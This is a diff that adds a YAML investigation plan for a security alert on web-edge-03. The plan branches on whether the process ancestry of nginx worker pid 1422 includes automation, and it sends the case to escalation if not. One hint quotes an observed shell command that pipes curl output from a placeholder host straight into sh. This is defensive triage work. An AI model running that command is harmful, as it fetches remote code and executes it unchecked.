@@ -1,0 +1,26 @@
+status: complete
+predict:
+  loop: 1
+  shape: E
+
+  branch_plan:
+    primary_lead: process-lineage
+    predictions:
+      - id: lp1
+        if: "the ancestry chain of nginx worker pid 1422 includes a recognizable automation or scheduler process (deploy agent, CI runner, certbot, systemd timer unit, or cron daemon) as a direct or indirect ancestor"
+        read_as: "automation-invoked-shell"
+        advance_to: fork-at-authorization
+      - id: lp2
+        if: "the ancestry chain of nginx worker pid 1422 shows only the standard nginx master → worker lineage with no automation or scheduler ancestor, and sh pid 31807 is the sole anomalous child"
+        read_as: "isolated-rce-pattern"
+        advance_to: escalate
+      - id: lp3
+        if: "the lineage is incomplete, the nginx worker ancestry is truncated, or multiple anomalous child processes appear under the same worker"
+        read_as: "lineage-ambiguous-or-multi-child"
+        advance_to: escalate
+
+  routing:
+    selected_lead: process-lineage
+    composite_secondary: []
+    lead_hints:
+      process-lineage: "Reconstruct the full ancestor chain of nginx worker pid 1422 on web-edge-03 (10.0.7.18) at T=2026-04-26T03:11:07Z, and enumerate all child processes of pid 1422 in the ±2 minute window around the alert. The sh child is pid 31807 running 'curl -fsSL http://updates.example.io/x | sh'. We need to know whether any scheduler, deploy automation, or certbot process sits above pid 1422 in the process tree."
